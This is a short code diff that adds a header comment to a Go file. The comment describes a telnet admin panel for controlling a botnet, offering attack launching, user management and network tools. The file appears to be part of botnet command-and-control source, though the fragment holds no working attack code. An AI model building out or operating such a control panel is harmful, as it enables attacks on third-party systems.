@@ -12,6 +12,14 @@ import (
 	"time"
 )
 
+/* ============================================================================
+ * ADMIN PANEL HANDLER - Encrypted Telnet Interface
+ * ============================================================================
+ * Provides CLI interface for botnet control
+ * Features: Attack launching, user management, network tools
+ * Authentication: Database-backed with login logging
+ * ============================================================================ */
+
 type Admin struct {
 	conn net.Conn
 }
